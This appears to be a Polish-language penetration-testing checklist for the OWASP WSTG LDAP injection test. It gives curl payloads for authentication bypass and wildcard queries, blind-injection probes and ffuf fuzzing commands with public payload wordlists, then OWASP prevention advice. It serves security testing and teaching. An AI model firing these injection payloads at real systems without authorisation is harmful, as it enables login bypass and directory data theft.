# WSTG-INPV-06 — Testing for LDAP Injection

## Cele

- Identify LDAP injection points
- Assess the severity of the injection

## KOMENDY

### Reczne testowanie LDAP injection

```bash
curl -s "https://TARGET/search?user=*" | head -50
curl -s "https://TARGET/search?user=admin)(|(password=*)" | head -50
curl -s "https://TARGET/search?user=*)(objectClass=*)" | head -50
curl -s "https://TARGET/login" -X POST -d "username=*&password=*"
curl -s "https://TARGET/login" -X POST -d "username=admin)(&password=anything"

```

### Testowanie blind LDAP

```bash
curl -s "https://TARGET/search?user=a*" | wc -c
curl -s "https://TARGET/search?user=b*" | wc -c

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings LDAP payloads

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/LDAP Injection/Intruder/LDAP_FUZZ.txt" -mc all -o output_ffuf_ldap.json

ffuf -u "https://TARGET/search?user=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/LDAP Injection/Intruder/LDAP_FUZZ_SMALL.txt" -mc all -o output_ffuf_ldap_small.json

```

### LDAP attributes enumeration

```bash
ffuf -u "https://TARGET/search?attr=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/LDAP Injection/Intruder/LDAP_attributes.txt" -mc all -o output_ffuf_ldap_attrs.json

```

### SecLists LDAP fuzzing

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LDAP.Fuzzing.txt -mc all -o output_ffuf_seclists_ldap.json

```

### fuzzdb LDAP

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/ldap/ldap-injection.txt -mc all -o output_ffuf_fuzzdb_ldap.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj formularze logowania i wyszukiwania ktore moga uzywac LDAP
2. Wstaw znaki specjalne LDAP: * ) ( | & = i sprawdz reakcje
3. Testuj bypass autentykacji: admin)(|(password=*)
4. Sprawdz error messages pod katem LDAP errors
5. Testuj blind LDAP injection porownujac rozmiary odpowiedzi


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — LDAP_Injection_Prevention_Cheat_Sheet.md

- Escapuj znaki specjalne DN: \ , + " < > ; (backslash-encoding)
- Escapuj znaki specjalne search filtra: * ( ) \ NUL
- Uzywaj frameworkow z wbudowanym LDAP encoding (np. Spring LDAP)
- Waliduj input allowlista — ogranicz dozwolone znaki
- Unikaj budowania zapytan LDAP przez konkatenacje stringow

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Active Scan++ | Rozszerzony skaner z checkami injection | [GitHub](https://github.com/albinowax/ActiveScanPlusPlus) |
